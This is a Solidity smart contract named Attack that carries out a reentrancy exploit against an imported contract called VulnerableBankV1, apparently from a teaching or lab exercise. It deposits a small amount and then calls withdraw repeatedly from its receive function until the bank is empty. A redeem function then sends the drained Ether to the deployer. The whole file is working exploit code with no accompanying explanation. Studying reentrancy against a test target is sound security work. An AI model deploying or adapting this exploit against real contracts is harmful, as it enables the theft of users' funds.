// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./VulnerableBankV1.sol";

contract Attack {
    VulnerableBankV1 public vulnerableBank;
    uint256 public constant AMOUNT = 0.00001 ether;
    address owner;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBankV1(_vulnerableBankAddress);
        owner=msg.sender;
    }

    // Receive function is called when Ether is sent directly to this contract.
    receive() external payable {
        if (address(vulnerableBank).balance >= AMOUNT) {
            vulnerableBank.withdraw(AMOUNT);  // Withdraw specific amount
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT, "Insufficient ETH sent for the attack");
        vulnerableBank.deposit{value: AMOUNT}();
        vulnerableBank.withdraw(AMOUNT);  // Start the withdrawal
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function redeem() external {
        // Send all received Ether to owner
        require(msg.sender==owner);
        payable(msg.sender).transfer(address(this).balance);
    }
}
